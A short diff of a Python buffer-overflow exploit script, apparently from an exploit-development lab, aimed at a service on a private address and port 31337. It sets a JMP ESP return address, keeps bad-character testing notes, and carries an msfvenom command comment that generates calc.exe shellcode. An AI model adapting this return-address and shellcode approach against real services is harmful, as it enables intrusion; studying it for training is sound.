@@ -3,12 +3,10 @@ import socket,sys
 from time import sleep
 ip="192.168.1.59"
 port=31337
-#addr =080414C3
-addr="\xC3\x14\x04\x08"
+addr="\xC3\x14\x04\x08" #JMP ESP adress in littleendian format
 
 #badchar_test = "" 			#start with empty string
 #badchars = [0x00, 0x0A]			#every time bad...
-#badchars += [0x04, 0x38, 0x72, xD9]
 
 #shellcode msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name shellcode CMD=calc.exe EXITFUNC=thread
 
